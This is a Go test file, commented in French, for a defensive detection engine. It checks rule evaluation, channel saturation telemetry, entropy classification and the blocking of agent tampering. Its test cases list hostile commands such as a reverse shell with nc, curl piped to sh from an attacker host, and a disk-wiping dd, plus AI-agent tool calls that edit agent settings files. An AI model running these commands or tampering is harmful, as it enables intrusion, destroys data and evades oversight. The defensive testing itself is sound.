package c2blueteam

import (
	"encoding/base64"
	"encoding/hex"
	"math/rand"
	"sync"
	"sync/atomic"
	"testing"
)

// TestEvasion_VectorA_NoBatchTruncation vérifie que l'évaluation ne tronque pas les lots (fermeture Vecteur A).
func TestEvasion_VectorA_NoBatchTruncation(t *testing.T) {
	const count = 32
	inBatch := make([]Probe_event_t, count)
	outBatch := make([]Probe_event_t, count)

	for i := 0; i < count; i++ {
		inBatch[i].Subsystem = C2BT_SUB_PROC
		inBatch[i].Action = C2BT_ACT_EXEC
		copy(inBatch[i].Payload[:], "curl")
	}

	evalCount := C2bt_eval_rules_batch(inBatch, outBatch, count)
	if evalCount != count {
		t.Fatalf("evalCount = %d, attendu %d", evalCount, count)
	}

	for i := 0; i < count; i++ {
		if (outBatch[i].Flags & C2BT_FLAG_LOLBAS) == 0 {
			t.Errorf("événement #%d sans drapeau LOLBAS (flags=0x%x)", i, outBatch[i].Flags)
		}
		if (outBatch[i].Flags & C2BT_FLAG_ANOMALY) == 0 {
			t.Errorf("événement #%d sans drapeau ANOMALY (flags=0x%x)", i, outBatch[i].Flags)
		}
	}
}

// TestEvasion_VectorC_SaturationCode vérifie que la saturation de la file est gérée sans blocage et avec télémétrie exacte (fermeture Vecteur C).
func TestEvasion_VectorC_SaturationCode(t *testing.T) {
	var ch Probe_channel_t
	C2bt_channel_init(&ch)

	var ev Probe_event_t
	ev.Subsystem = C2BT_SUB_PROC
	ev.Action = C2BT_ACT_EXEC
	copy(ev.Payload[:], "ls")

	// Remplissage des 1024 créneaux
	written := 0
	for i := 0; i < 2000; i++ {
		res := C2bt_channel_write(&ch, &ev)
		if res == 0 {
			written++
		} else if res == -2 {
			// Saturation atteinte proprement
			break
		}
	}

	if written != 1024 {
		t.Errorf("nombre d'événements écrits avant saturation = %d, attendu 1024", written)
	}
	if drops := C2bt_channel_get_drops(&ch); drops != 1 {
		t.Errorf("compteur de drop après première saturation = %d, attendu 1", drops)
	}

	// 50 tentatives d'écriture supplémentaires sur file saturée : doit refuser et incrémenter
	for i := 0; i < 50; i++ {
		res := C2bt_channel_write(&ch, &ev)
		if res != -2 {
			t.Errorf("écriture sur file saturée #%d = %d, attendu -2 (saturation)", i, res)
		}
	}
	if drops := C2bt_channel_get_drops(&ch); drops != 51 {
		t.Errorf("compteur total de drops = %d, attendu 51", drops)
	}
}

// TestEvasion_VectorC_ConcurrentDropsUnderSaturationBurst vérifie l'exactitude stricte du compteur de drop
// sous une rafale concurrente massivement saturée (multiples producteurs sous contention sans verrou).
func TestEvasion_VectorC_ConcurrentDropsUnderSaturationBurst(t *testing.T) {
	var ch Probe_channel_t
	C2bt_channel_init(&ch)

	var seedEv Probe_event_t
	seedEv.Subsystem = C2BT_SUB_PROC
	seedEv.Action = C2BT_ACT_EXEC
	copy(seedEv.Payload[:], "burst_probe")

	// 1. Remplissage initial jusqu'à saturation complète de l'anneau (1024 slots)
	for i := 0; i < 1024; i++ {
		if res := C2bt_channel_write(&ch, &seedEv); res != 0 {
			t.Fatalf("échec d'écriture pré-remplissage #%d: code %d", i, res)
		}
	}
	if initialDrops := C2bt_channel_get_drops(&ch); initialDrops != 0 {
		t.Fatalf("drops avant burst = %d, attendu 0", initialDrops)
	}

	// 2. Lancement d'une rafale de 16 goroutines concurrentes effectuant 5 000 écritures chacune
	const numGoroutines = 16
	const writesPerGoroutine = 5000
	const expectedDrops = uint64(numGoroutines * writesPerGoroutine)

	var wg sync.WaitGroup
	var localRejections uint64

	startBarrier := make(chan struct{})

	for g := 0; g < numGoroutines; g++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			var ev Probe_event_t
			ev.Pid = uint32(2000 + id)
			ev.Subsystem = C2BT_SUB_NET
			ev.Action = C2BT_ACT_CONNECT
			copy(ev.Payload[:], "concurrent_payload")

			<-startBarrier // Synchronisation du départ de la rafale

			for i := 0; i < writesPerGoroutine; i++ {
				res := C2bt_channel_write(&ch, &ev)
				if res == -2 {
					atomic.AddUint64(&localRejections, 1)
				}
			}
		}(g)
	}

	close(startBarrier)
	wg.Wait()

	// 3. Vérification de l'exactitude stricte de la télémétrie atomique
	reportedDrops := C2bt_channel_get_drops(&ch)
	if reportedDrops != expectedDrops {
		t.Fatalf("compteur atomique de rejets ch.Drops = %d, attendu %d", reportedDrops, expectedDrops)
	}
	if localRejections != expectedDrops {
		t.Fatalf("rejets constatés par les goroutines = %d, attendu %d", localRejections, expectedDrops)
	}
	if reportedDrops != localRejections {
		t.Fatalf("désaccord entre compteur de canal (%d) et retour local (%d)", reportedDrops, localRejections)
	}

	// 4. Épreuve de conservation de flux SPSC sous rafale saturée asynchrone (1 Producteur, 1 Consommateur)
	var spscCh Probe_channel_t
	C2bt_channel_init(&spscCh)

	const spscTotalEvents = 100000
	var spscWrittenSuccess uint64
	var spscDrops uint64
	var spscReadSuccess uint64

	var spscProdWg sync.WaitGroup
	var spscConsWg sync.WaitGroup
	spscStopReader := make(chan struct{})

	// Consommateur SPSC (lit par batchs de 8)
	spscConsWg.Add(1)
	go func() {
		defer spscConsWg.Done()
		batch := make([]Probe_event_t, 8)
		for {
			select {
			case <-spscStopReader:
				// Vider le reliquat dans l'anneau
				for {
					n := C2bt_channel_read_batch(&spscCh, batch, 8)
					if n <= 0 {
						break
					}
					atomic.AddUint64(&spscReadSuccess, uint64(n))
				}
				return
			default:
				n := C2bt_channel_read_batch(&spscCh, batch, 8)
				if n > 0 {
					atomic.AddUint64(&spscReadSuccess, uint64(n))
				}
			}
		}
	}()

	// Producteur SPSC (émet 100 000 événements en rafale saturante)
	spscProdWg.Add(1)
	go func() {
		defer spscProdWg.Done()
		var ev Probe_event_t
		ev.Subsystem = C2BT_SUB_PROC
		ev.Action = C2BT_ACT_EXEC
		copy(ev.Payload[:], "spsc_burst")

		for i := 0; i < spscTotalEvents; i++ {
			ev.Pid = uint32(i + 1)
			res := C2bt_channel_write(&spscCh, &ev)
			if res == 0 {
				atomic.AddUint64(&spscWrittenSuccess, 1)
			} else if res == -2 {
				atomic.AddUint64(&spscDrops, 1)
			}
		}
	}()

	spscProdWg.Wait()
	close(spscStopReader)
	spscConsWg.Wait()

	// Vérification des invariants stricts de conservation du flux
	reportedSpscDrops := C2bt_channel_get_drops(&spscCh)
	if reportedSpscDrops != spscDrops {
		t.Fatalf("compteur atomique de drops SPSC = %d, rejets mesurés = %d", reportedSpscDrops, spscDrops)
	}
	if spscWrittenSuccess+spscDrops != spscTotalEvents {
		t.Fatalf("somme (écritures=%d + drops=%d) = %d, attendu %d", spscWrittenSuccess, spscDrops, spscWrittenSuccess+spscDrops, spscTotalEvents)
	}
	if spscReadSuccess != spscWrittenSuccess {
		t.Fatalf("événements lus (%d) != événements écrits acceptés (%d)", spscReadSuccess, spscWrittenSuccess)
	}

	// 5. Épreuve Multi-Canaux Parallèles SPSC (Architecture 4 Canaux Indépendants de C2BLUETEAM)
	const numChannels = 4
	channels := make([]Probe_channel_t, numChannels)
	for c := 0; c < numChannels; c++ {
		C2bt_channel_init(&channels[c])
	}

	var prodWg sync.WaitGroup
	var consWg sync.WaitGroup
	const eventsPerChan = 25000
	chanWritten := make([]uint64, numChannels)
	chanDrops := make([]uint64, numChannels)
	chanRead := make([]uint64, numChannels)
	stopChanReaders := make([]chan struct{}, numChannels)

	for c := 0; c < numChannels; c++ {
		cIdx := c
		stopChanReaders[cIdx] = make(chan struct{})

		// Consommateur du canal cIdx
		consWg.Add(1)
		go func(idx int, stopCh chan struct{}) {
			defer consWg.Done()
			var ev Probe_event_t
			for {
				select {
				case <-stopCh:
					for C2bt_channel_read(&channels[idx], &ev) == 1 {
						chanRead[idx]++
					}
					return
				default:
					if C2bt_channel_read(&channels[idx], &ev) == 1 {
						chanRead[idx]++
					}
				}
			}
		}(cIdx, stopChanReaders[cIdx])

		// Producteur du canal cIdx
		prodWg.Add(1)
		go func(idx int) {
			defer prodWg.Done()
			var ev Probe_event_t
			ev.Subsystem = uint16(idx + 1)
			ev.Action = C2BT_ACT_WRITE
			copy(ev.Payload[:], "multichan_burst")

			for i := 0; i < eventsPerChan; i++ {
				ev.Pid = uint32(10000 + i)
				res := C2bt_channel_write(&channels[idx], &ev)
				if res == 0 {
					chanWritten[idx]++
				} else if res == -2 {
					chanDrops[idx]++
				}
			}
		}(cIdx)
	}

	prodWg.Wait()
	for c := 0; c < numChannels; c++ {
		close(stopChanReaders[c])
	}
	consWg.Wait()

	for c := 0; c < numChannels; c++ {
		reported := C2bt_channel_get_drops(&channels[c])
		if reported != chanDrops[c] {
			t.Errorf("canal #%d: drops atomiques = %d, rejets mesurés = %d", c, reported, chanDrops[c])
		}
		if chanWritten[c]+chanDrops[c] != eventsPerChan {
			t.Errorf("canal #%d: conservation violée (%d + %d != %d)", c, chanWritten[c], chanDrops[c], eventsPerChan)
		}
		if chanRead[c] != chanWritten[c] {
			t.Errorf("canal #%d: lus (%d) != écrits (%d)", c, chanRead[c], chanWritten[c])
		}
	}
}

// TestEvasion_VectorD_RestrictedAlphabetClassification vérifie la classification Base64 / Hex vs Crypto / Prose (fermeture Vecteur D).
func TestEvasion_VectorD_RestrictedAlphabetClassification(t *testing.T) {
	rng := rand.New(rand.NewSource(1337))

	// 1. Charge Base64 (H ~ 5.99 b/o, Q8.8 ~ 1534)
	rawBytes := make([]byte, 3072)
	rng.Read(rawBytes)
	b64Str := base64.StdEncoding.EncodeToString(rawBytes) // 4096 octets
	b64Bytes := []byte(b64Str)

	b64Entropy := C2bt_calc_entropy_8_8(b64Bytes, uint64(len(b64Bytes)))
	if b64Entropy < 1400 || b64Entropy > 1536 {
		t.Errorf("entropie Base64 = %d, attendue dans [1400, 1536]", b64Entropy)
	}

	// 2. Charge Hexadécimale (H ~ 4.00 b/o, Q8.8 ~ 1024)
	rawHexBytes := make([]byte, 2048)
	rng.Read(rawHexBytes)
	hexStr := hex.EncodeToString(rawHexBytes) // 4096 octets
	hexBytes := []byte(hexStr)

	hexEntropy := C2bt_calc_entropy_8_8(hexBytes, uint64(len(hexBytes)))
	if hexEntropy < 950 || hexEntropy > 1024 {
		t.Errorf("entropie Hex = %d, attendue dans [950, 1024]", hexEntropy)
	}

	// 3. Données Chiffrées / Aléatoires pures (H ~ 8.00 b/o, Q8.8 ~ 2048)
	cryptoBytes := make([]byte, 4096)
	rng.Read(cryptoBytes)
	cryptoEntropy := C2bt_calc_entropy_8_8(cryptoBytes, uint64(len(cryptoBytes)))
	if cryptoEntropy < 1920 {
		t.Errorf("entropie Crypto/Aléatoire = %d, attendue >= 1920 (seuil 7.5 b/o)", cryptoEntropy)
	}
}

// TestEvasion_VectorE_LOLBASPathAndArguments vérifie l'interception de chemins absolus et arguments (fermeture Vecteur E).
func TestEvasion_VectorE_LOLBASPathAndArguments(t *testing.T) {
	testCases := []struct {
		cmd          string
		expectedFlag uint32
	}{
		{"curl", C2BT_FLAG_LOLBAS},
		{"/usr/bin/curl", C2BT_FLAG_LOLBAS},
		{"/usr/bin/curl -fsSL https://attacker.com/sh", C2BT_FLAG_LOLBAS},
		{"/bin/sh -c whoami", C2BT_FLAG_LOLBAS},
		{"/usr/bin/python3 -c 'import socket'", C2BT_FLAG_LOLBAS},
		{"/usr/local/bin/socat tcp-listen:4444", C2BT_FLAG_LOLBAS},
		{"nc -e /bin/bash 10.0.0.1 4444", C2BT_FLAG_LOLBAS},
		{"ls -la /tmp", C2BT_FLAG_VERDICT_OK},
		{"git status", C2BT_FLAG_VERDICT_OK},
	}

	inBatch := make([]Probe_event_t, len(testCases))
	outBatch := make([]Probe_event_t, len(testCases))

	for i, tc := range testCases {
		inBatch[i].Subsystem = C2BT_SUB_PROC
		inBatch[i].Action = C2BT_ACT_EXEC
		copy(inBatch[i].Payload[:], tc.cmd)
	}

	evalCount := C2bt_eval_rules_batch(inBatch, outBatch, len(testCases))
	if evalCount != len(testCases) {
		t.Fatalf("evalCount = %d, attendu %d", evalCount, len(testCases))
	}

	for i, tc := range testCases {
		if (outBatch[i].Flags & tc.expectedFlag) == 0 {
			t.Errorf("commande %q: drapeau attendu 0x%x absent (flags=0x%x)", tc.cmd, tc.expectedFlag, outBatch[i].Flags)
		}
	}
}

// TestEvasion_VectorF_HarnessDoctrineProtection vérifie la protection des fichiers de doctrine (fermeture Vecteur F).
func TestEvasion_VectorF_HarnessDoctrineProtection(t *testing.T) {
	testCases := []struct {
		subsystem    uint16
		action       uint16
		payload      string
		expectedFlag uint32
	}{
		{C2BT_SUB_FS, C2BT_ACT_WRITE, "/home/u/.claude/settings.json", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_FS, C2BT_ACT_WRITE, "/home/u/.claude", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_FS, C2BT_ACT_WRITE, "/devhoros/AGENTS.md", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_MCP, C2BT_ACT_TOOL_CALL, "replace_file_content AGENTS.md", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_MCP, C2BT_ACT_TOOL_CALL, "run_command curl | sh", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_MCP, C2BT_ACT_TOOL_CALL, "run_command dd if=/dev/zero of=/dev/sda", C2BT_FLAG_BLOCKED},
		{C2BT_SUB_MCP, C2BT_ACT_TOOL_CALL, "view_file /devhoros/main.go", C2BT_FLAG_VERDICT_OK},
	}

	inBatch := make([]Probe_event_t, len(testCases))
	outBatch := make([]Probe_event_t, len(testCases))

	for i, tc := range testCases {
		inBatch[i].Subsystem = tc.subsystem
		inBatch[i].Action = tc.action
		copy(inBatch[i].Payload[:], tc.payload)
	}

	evalCount := C2bt_eval_rules_batch(inBatch, outBatch, len(testCases))
	if evalCount != len(testCases) {
		t.Fatalf("evalCount = %d, attendu %d", evalCount, len(testCases))
	}

	for i, tc := range testCases {
		if (outBatch[i].Flags & tc.expectedFlag) == 0 {
			t.Errorf("payload %q: drapeau attendu 0x%x absent (flags=0x%x)", tc.payload, tc.expectedFlag, outBatch[i].Flags)
		}
	}
}
